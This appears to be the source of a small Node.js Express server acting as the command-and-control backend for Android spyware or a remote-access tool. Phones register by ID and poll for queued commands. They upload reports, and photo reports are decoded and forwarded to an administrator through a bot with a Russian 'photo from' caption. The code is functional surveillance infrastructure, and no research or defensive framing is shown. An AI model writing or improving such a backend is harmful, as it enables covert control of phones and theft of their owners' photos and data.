const express = require('express');
const db = require('./db');
const { notifyAdmin } = require('./bot');

const app = express();
app.use(express.json({ limit: '25mb' }));

app.post('/api/register', (req, res) => {
  const { id, model } = req.body || {};
  if (!id) return res.status(400).json({ ok: false });
  db.addDevice(id, model || 'android');
  res.json({ ok: true });
});

app.get('/api/poll', (req, res) => {
  const id = req.query.id;
  if (!id) return res.status(400).json({ ok: false });
  db.addDevice(id, req.query.model || 'android');
  const cmds = db.pullCommands(id);
  res.json({ ok: true, cmds });
});

app.post('/api/report', async (req, res) => {
  const { id, kind, body } = req.body || {};
  if (!id || !kind) return res.status(400).json({ ok: false });
  db.saveReport(id, kind, body || '');
  try {
    if (kind === 'photo' && body) {
      const buf = Buffer.from(body, 'base64');
      await notifyAdmin('photo', buf, `фото с ${id.slice(0,6)}`);
    }
  } catch (e) {}
  res.json({ ok: true });
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log('server up :' + port));